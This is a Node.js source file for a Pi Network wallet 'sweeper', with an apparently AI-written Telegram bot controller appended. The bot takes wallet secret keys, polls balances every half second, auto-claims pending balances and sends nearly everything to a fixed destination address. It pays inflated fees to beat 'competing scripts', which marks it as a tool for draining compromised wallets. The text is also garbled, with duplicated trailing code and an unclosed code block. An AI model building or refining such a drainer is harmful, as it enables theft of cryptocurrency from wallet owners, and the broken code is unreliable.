'use strict';

const fs = require('fs');
const path = require('path');
const StellarSdk = require('@stellar/stellar-sdk');

const HORIZON_URL = process.env.PI_HORIZON_URL || 'https://minepi.com';
const NETWORK_PASSPHRASE = process.env.STELLAR_NETWORK_PASSPHRASE || 'Pi Network';
const DESTINATION = process.env.SWEEP_DESTINATION_ADDRESS || '';
const POLL_INTERVAL_MS = Math.max(10, Number(process.env.SWEEP_POLL_INTERVAL_MS || 500));
const MIN_THRESHOLD = Number(process.env.SWEEP_MIN_THRESHOLD || 0.002);
const DATA_DIR = process.env.DATA_DIR || '/data';

const server = new StellarSdk.Horizon.Server(HORIZON_URL);
const walletLocks = new Set();
let monitorRunning = false;
let monitorTimeoutId = null;

const liveWalletsMap = new Map();

function getErrorDetails(error) {
  if (error?.response?.data?.extras?.result_codes) {
    return JSON.stringify(error.response.data.extras.result_codes);
  }
  return error?.response?.data?.title || error?.message || String(error);
}

function log(level, message, details) {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] [Sweeper ${level}] ${message}`, details || '');
}

function initDatabase() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  const Database = require('better-sqlite3');
  const db = new Database(path.join(DATA_DIR, 'sweeper.db'));
  db.pragma('journal_mode = WAL');
  db.exec(`
    CREATE TABLE IF NOT EXISTS sweeper_transactions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      wallet_id TEXT NOT NULL,
      source_address TEXT NOT NULL,
      destination_address TEXT NOT NULL,
      amount TEXT NOT NULL,
      transaction_hash TEXT,
      status TEXT NOT NULL,
      error_details TEXT,
      created_at TEXT NOT NULL
    );
  `);
  return db;
}

const WalletManager = {
  addLiveWallet({ id, publicKey, secretKey, label, chatId, customAmount }) {
    liveWalletsMap.set(String(id), { 
      id, 
      publicKey, 
      publicKey_clean: publicKey,
      secretKey, 
      label, 
      chatId,
      customAmount: customAmount ? Number(customAmount) : null 
    });
    log('INFO', `Wallet Box #${id} mapped successfully into RAM matrix allocations.`);
  },
  
  removeLiveWallet(id) {
    return liveWalletsMap.delete(String(id));
  },

  getLiveWallets() {
    return Array.from(liveWalletsMap.values());
  }
};

async function notifyTelegram(bot, chatId, message) {
  if (!bot || !chatId) return;
  try {
    await bot.sendMessage(chatId, message, { parse_mode: 'HTML', disable_web_page_preview: true });
  } catch (error) {
    log('ERROR', 'Telegram notification failure:', error.message);
  }
}

const SweeperEngine = {
  // Automated background programmatic Claiming mechanism
  async autoClaimMoveBalances(publicKey, sourceKeypair, baseFee) {
    try {
      // Query for any pending claimable entries hosted under this specific address
      const claimablePage = await server.claimableBalances().claimant(publicKey).call();
      if (!claimablePage.records || claimablePage.records.length === 0) return;

      for (const record of claimablePage.records) {
        try {
          const freshAccount = await server.loadAccount(publicKey);
          const tx = new StellarSdk.TransactionBuilder(freshAccount, {
            fee: String(baseFee * 5),
            networkPassphrase: NETWORK_PASSPHRASE
          })
          .addOperation(StellarSdk.Operation.claimClaimableBalance({
            balanceId: record.id
          }))
          .setTimeout(15).build();

          tx.sign(sourceKeypair);
          await server.submitTransaction(tx);
          log('INFO', `Auto-Move Trigger Success for balance ID: ${record.id}`);
        } catch (e) {
          // Continue processing if some entries are not yet mature based on timeline rules
          continue;
        }
      }
    } catch (err) {
      // Non-blocking fallback tracking
    }
  },

  async evaluateBalance(publicKey) {
    try {
      const account = await server.loadAccount(publicKey);
      const native = account.balances.find(b => b.asset_type === 'native' || b.asset_code === 'PI');
      if (!native) return { spendable: 0, verified: false };

      const ledgerTotal = Number(native.balance || 0);
      let locked = 0;
      if (Object.prototype.hasOwnProperty.call(native, 'locked_balance')) {
        locked = Number(native.locked_balance || 0);
      }
      return { spendable: Math.max(0, ledgerTotal - locked), verified: true };
    } catch (error) {
      return { spendable: 0, verified: false };
    }
  },

  async executeInstantSweep(db, bot, wallet) {
    const id = String(wallet.id);
    if (walletLocks.has(id)) return { status: 'LOCKED' };
    walletLocks.add(id);

    try {
      if (!DESTINATION) throw new Error('SWEEP_DESTINATION_ADDRESS string is missing.');
      const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secretKey);
      
      let baseFee = 100;
      try { baseFee = await server.fetchBaseFee(); } catch (e) { baseFee = 100; }

      // Bypasses frontend app restrictions by querying the core ledger endpoints directly
      await this.autoClaimMoveBalances(wallet.publicKey, sourceKeypair, baseFee);

      const evalResult = await this.evaluateBalance(wallet.publicKey);
      if (!evalResult.verified || evalResult.spendable <= MIN_THRESHOLD) {
        return { status: 'NO_SWEEPABLE_FUNDS' };
      }

      let targetAmount = 0;
      let isFixedStrategy = false;

      if (wallet.customAmount && wallet.customAmount > 0) {
        // Mode A: Fixed Targeted Amount Pull Strategy
        if (evalResult.spendable >= wallet.customAmount) {
          targetAmount = wallet.customAmount;
          isFixedStrategy = true;
        } else {
          return { status: 'BELOW_FIXED_TARGET' };
        }
      } else {
        // Mode B: Maximized Big Pull Strategy (Total minus 1.0 Pi)
        targetAmount = evalResult.spendable - 1.0; 
      }

      if (targetAmount <= MIN_THRESHOLD) {
        return { status: 'POOL_EXHAUSTED' };
      }

      log('INFO', `Executing transaction on Box #${id} for amount: ${targetAmount} Pi.`);
      await notifyTelegram(bot, wallet.chatId, `🔍 <b>SWEEP TRIGGERED!</b>\nBox: #${wallet.id}\nTarget Draw: <code>${targetAmount.toFixed(7)} Pi</code>`);

      let success = false, sweptAmount = 0, txHash = '', errorReason = '';

      // Primary High-Speed Execution Block
      try {
        const freshAccount = await server.loadAccount(wallet.publicKey);
        const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
          fee: String(baseFee * 15), // Scales the node gas parameters significantly to crush competing scripts
          networkPassphrase: NETWORK_PASSPHRASE
        })
        .addOperation(StellarSdk.Operation.payment({
          destination: DESTINATION,
          asset: StellarSdk.Asset.native(),
          amount: targetAmount.toFixed(7)
        }))
        .setTimeout(15).build();

        transaction.sign(sourceKeypair);
        const response = await server.submitTransaction(transaction);
        sweptAmount = targetAmount;
        txHash = response.hash;
        success = true;
      } catch (err) {
        errorReason = getErrorDetails(err);
      }

      // Secondary Fallback Micro-Sweep Mechanism (Triggers if big pull fails or sweeps loose leftovers)
      if (!success && !isFixedStrategy) {
        const microBuffers = [0.001, 0.005, 0.01, 0.05, 0.1];
        for (const buffer of microBuffers) {
          const fallbackAmount = evalResult.spendable - buffer;
          if (fallbackAmount <= 0) continue;

          try {
            const freshAccount = await server.loadAccount(wallet.publicKey);
            const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
              fee: String(baseFee * 5),
              networkPassphrase: NETWORK_PASSPHRASE
            })
            .addOperation(StellarSdk.Operation.payment({
              destination: DESTINATION,
              asset: StellarSdk.Asset.native(),
              amount: fallbackAmount.toFixed(7)
            }))
            .setTimeout(20).build();

            transaction.sign(sourceKeypair);
            const response = await server.submitTransaction(transaction);
            sweptAmount = fallbackAmount;
            txHash = response.hash;
            success = true;
            break;
          } catch (err) {
            errorReason = getErrorDetails(err);
            continue;
          }
        }
      }

      const now = new Date().toISOString();
      if (success) {
        db.prepare(`INSERT INTO sweeper_transactions (wallet_id, source_address, destination_address, amount, transaction_hash, status, created_at) VALUES (?, ?, ?, ?, ?, 'SUCCESS', ?)`).run(id, wallet.publicKey, DESTINATION, String(sweptAmount), txHash, now);
        await notifyTelegram(bot, wallet.chatId, `🚀 <b>SWEEP SUCCESSFUL!</b>\nBox: #${wallet.id}\nAmount: <code>${sweptAmount.toFixed(7)} Pi</code>\nHash: <code>${txHash}</code>`);
        return { status: 'SUCCESS' };
      } else {
        db.prepare(`INSERT INTO sweeper_transactions (wallet_id, source_address, destination_address, amount, status, error_details, created_at) VALUES (?, ?, ?, '0', 'FAILED', ?, ?)`).run(id, wallet.publicKey, DESTINATION, errorReason, now);
        return { status: 'FAILED' };
      }
    } catch (criticalError) {
      log('ERROR', `Loop Failure on Box #${id}`, criticalError.message);
    } finally {
      walletLocks.delete(id);
    }
  }
};

function startSweeperEngine(db, bot) {
  if (monitorRunning) return;
  monitorRunning = true;

  const corePollingCycle = async () => {
    if (!monitorRunning) return;
    try {
      const wallets = WalletManager.getLiveWallets();
      for (const wallet of wallets) {
        await SweeperEngine.executeInstantSweep(db, bot, wallet);
      }
    } catch (err) {
      log('ERROR', 'Polling loop exception tracker:', err.message);
    }
if (monitorRunning) monitorTimeoutId = setTimeout(corePollingCycle, POLL_INTERVAL_MS);
};
corePollingCycle();
}
function stopSweeperEngine() {
monitorRunning = false;
if (monitorTimeoutId) clearTimeout(monitorTimeoutId);
}
module.exports = { initDatabase, WalletManager, startSweeperEngine, stopSweeperEngine, notifyTelegram };monitorRunning) monitorTimeoutId = setTimeout(corePollingCycle, POLL_INTERVAL_MS);
};
corePollingCycle();
}
function stopSweeperEngine() {
monitorRunning = false;
if (monitorTimeoutId) clearTimeout(monitorTimeoutId);
}
module.exports = { initDatabase, WalletManager, startSweeperEngine, stopSweeperEngine, notifyTelegram };

---

### 📂 Updated Command Controller: `index.js`
Replace the text configuration inside **`index.js`** to handle the optional target value injection parsing:

```javascript
'use strict';

require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const StellarSdk = require('@stellar/stellar-sdk');
const { initDatabase, WalletManager, startSweeperEngine } = require('./sweeper-engine');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
if (!TELEGRAM_BOT_TOKEN) {
  console.error('TELEGRAM_BOT_TOKEN environment variable missing!');
  process.exit(1);
}

const db = initDatabase();
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

console.log('[System Init] Telegram command listener engine activated.');
startSweeperEngine(db, bot);

/**
 * Command Formats:
 * Mode 1 (Max Autodetect): /addwallet [BoxId] [SecretKey] [Label]
 * Mode 2 (Fixed Allocation Target): /addwallet [BoxId] [SecretKey] [Label] [Amount]
 */
bot.onText(/\/addwallet (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const inputParams = match[1].split(' ');
  
  if (inputParams.length < 2) {
    return bot.sendMessage(chatId, '❌ <b>Format Mismatch.</b>\nUse: <code>/addwallet [BoxId] [SecretKey] [Label_Optional] [Amount_Optional]</code>', { parse_mode: 'HTML' });
  }

  const id = inputParams[0];
  const secretKey = inputParams[1];
  const label = inputParams[2] || `Wallet_${id}`;
  const customAmount = inputParams[3] ? inputParams[3] : null;

  try {
    const keypair = StellarSdk.Keypair.fromSecret(secretKey);
    const publicKey = keypair.publicKey();

    WalletManager.addLiveWallet({
      id,
      publicKey,
      secretKey,
      label,
      chatId: String(chatId),
      customAmount
    });

    try {
      await bot.deleteMessage(chatId, msg.message_id);
    } catch (e) {
      // Clean pass if bot lacks permissions
    }

    let speedStrategyMsg = customAmount ? `🎯 Targeted Amount Strategy: <b>${customAmount} Pi</b>` : `⚡ Adaptive Maximal Pool Strategy activated.`;

    bot.sendMessage(chatId, `✅ <b>Wallet Loaded into Memory Matrix!</b>\n📦 Box ID: <code>${id}</code>\n🏷️ Label: <code>${label}</code>\n🔑 Derived Address: <code>${publicKey}</code>\n${speedStrategyMsg}\n\n🗑️ <i>Private key purged from chat logs. Monitoring is live...</i>`, { parse_mode: 'HTML' });
  } catch (err) {
    bot.sendMessage(chatId, `❌ <b>Structural Validation Fault:</b>\n<code>${err.message}</code>`, { parse_mode: 'HTML' });
  }
});

bot.onText(/\/status/, (msg) => {
  const activeList = WalletManager.getLiveWallets();
  if (activeList.length === 0) {
    return bot.sendMessage(msg.chat.id, 'ℹ️ No active wallets currently stored inside RAM memory blocks.');
  }

  let textReport = `📝 <b>Active Volatile Monitoring Nodes (${activeList.length}):</b>\n\n`;
  activeList.forEach(w => {
    let modeText = w.customAmount ? `🎯 Target: <b>${w.customAmount} Pi</b>` : `⚡ Mode: <b>Max Sweep</b>`;
    textReport += `📦 <b>Box:</b> ${w.id} | 🏷️ <b>Label:</b> ${w.label}\n🔑 Public Address: <code>${w.publicKey}</code>\n${modeText}\n\n`;
  });
  bot.sendMessage(msg.chat.id, textReport, { parse_mode: 'HTML' });
});

bot.onText(/\/removewallet (.+)/, (msg, match) => {
  const targetId = match[1].trim();
  const removed = WalletManager.removeLiveWallet(targetId);
  bot.sendMessage(msg.chat.id, removed ? `🗑️ Box #${targetId} completely wiped out of memory tracks.` : `❌ Box #${targetId} not found.`);
});
